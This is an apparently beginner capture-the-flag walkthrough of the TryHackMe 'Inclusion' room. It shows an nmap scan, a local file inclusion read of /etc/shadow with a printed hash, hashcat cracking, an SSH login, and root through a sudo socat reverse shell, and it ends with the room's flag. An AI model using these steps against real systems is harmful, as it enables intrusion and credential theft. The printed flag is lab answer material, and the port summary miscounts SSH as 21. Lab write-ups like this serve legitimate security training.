# [Inclusion-THM](https://tryhackme.com/room/inclusion)


This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability. 

--------------

# Scanning Steps :

**No Robots.txt Found**

**No source code Found**

## STEP 1 :

Scanning Open Ports

```bash
nmap -sC -sV $IP
```

Nmap output

```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.32 seconds

```

Found open ports

**SSH 21 OPEN**

**HTTP 80 OPEN**

**NO PATHS FOUND**

-------------------

# Exploiting Steps :

Found page : http://IP/article?name=

**NO SQL injection FOUND**

## [Local File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion) Exploit Found

## STEP 1 :

Trying to access **/etc/shadow**

```bash
falconfeast:$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:18281:0:99999:7:::
```

Found Username : **falconfeast**

## STEP 2 :

Cracking password

```bash
hashcat -m 1800 hash.txt x.txt

rootpassword
```

Found Password : **rootpassword**

## STEP 3 :

Connecting to **SSH**

```bash
ssh falconfeast@ip
password :

$ cd /home
$ ls
falconfeast
$ cd falconfeast
$ ls
user.txt
```

**FOUND USER.TXT**

## STEP 4 :

Checking **Sudo Privileges**

```bash
(root) NOPASSWD: /usr/bin/socat
```

## STEP 5 :

Start Listening using **socat**

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

Spawn Shell with **socat**

```bash
sudo socat tcp-connect:$IP:4444 exec:sh,pty,stderr,setsid,sigint,sane

# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
42964104845495153909
# 
```

**FOUND ROOT.TXT**
